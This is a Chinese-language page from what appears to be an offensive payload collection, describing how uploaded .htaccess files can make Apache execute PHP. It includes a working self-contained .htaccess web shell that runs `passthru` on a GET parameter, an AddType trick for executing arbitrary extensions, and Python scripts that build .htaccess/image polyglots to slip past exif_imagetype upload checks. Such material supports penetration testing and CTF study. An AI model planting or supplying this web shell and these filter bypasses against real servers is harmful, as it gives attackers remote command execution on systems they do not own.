[原文文档](README.en.md)

# .htaccess

上传 .htaccess 文件来覆盖 Apache 规则并执行 PHP。
"黑客还可以使用 '.htaccess' 文件技巧上传带有任何扩展名的恶意文件并执行它。举一个简单的例子，想象一下向易受攻击的服务器上传一个 .htaccess 文件，该文件具有 AddType application/x-httpd-php .htaccess 配置，并且还包含 PHP shellcode。由于恶意的 .htaccess 文件，Web 服务器将 .htaccess 文件视为可执行的 php 文件并执行其恶意的 PHP shellcode。需要注意的一点是：.htaccess 配置仅适用于 .htaccess 文件上传的同一目录和子目录。"

## 概述

* [AddType 指令](#addtype-指令)
* [自包含 .htaccess](#自包含-htaccess)
* [混合 .htaccess](#混合-htaccess)
* [参考文献](#参考文献)

## AddType 指令

上传包含以下内容的 .htaccess：`AddType application/x-httpd-php .rce`
然后上传任何带有 `.rce` 扩展名的文件。

## 自包含 .htaccess

```python
# 自包含的 .htaccess 网页 shell - htshell 项目的一部分
# 由 Wireghoul 编写 - http://www.justanotherhacker.com

# 覆盖默认拒绝规则以使 .htaccess 文件可通过 Web 访问
<Files ~ "^\.ht">
Order allow,deny
Allow from all
</Files>

# 使 .htaccess 文件被解释为 php 文件。这在 apache 解释完 .htaccess 文件中的 apache 指令后发生
AddType application/x-httpd-php .htaccess
```

```php
###### SHELL ######
<?php echo "\n";passthru($_GET['c']." 2>&1"); ?>
```

## 混合 .htaccess

如果在服务器端使用 `exif_imagetype` 函数来确定图像类型，请创建 `.htaccess/image` 混合文件。

[支持的图像类型](http://php.net/manual/en/function.exif-imagetype.php#refsect1-function.exif-imagetype-constants) 包括 [X 位图 (XBM)](https://en.wikipedia.org/wiki/X_BitMap) 和 [WBMP](https://en.wikipedia.org/wiki/Wireless_Application_Protocol_Bitmap_Format)。在 `.htaccess` 中忽略以 `\x00` 和 `#` 开头的行，您可以使用这些脚本来生成有效的 `.htaccess/image` 混合文件。

* 创建有效的 `.htaccess/xbm` 图像

    ```python
    width = 50
    height = 50
    payload = '# .htaccess file'

    with open('.htaccess', 'w') as htaccess:
        htaccess.write('#define test_width %d\n' % (width, ))
        htaccess.write('#define test_height %d\n' % (height, ))
        htaccess.write(payload)
    ```

* 创建有效的 `.htaccess/wbmp` 图像

    ```python
    type_header = b'\x00'
    fixed_header = b'\x00'
    width = b'50'
    height = b'50'
    payload = b'# .htaccess file'

    with open('.htaccess', 'wb') as htaccess:
        htaccess.write(type_header + fixed_header + width + height)
        htaccess.write(b'\n')
        htaccess.write(payload)
    ```

## 参考文献

* [通过 .htaccess 攻击 Web 服务器 - Eldar Marcussen - 2011年5月17日](http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html)
* [不受限制的文件上传漏洞的保护 - Narendra Shinde - 2015年10月22日](https://blog.qualys.com/securitylabs/2015/10/22/unrestricted-file-upload-vulnerability)
* [Insomnihack Teaser 2019 / l33t-hoster - Ian Bouchard (@Corb3nik) - 2019年1月20日](http://corb3nik.github.io/blog/insomnihack-teaser-2019/l33t-hoster)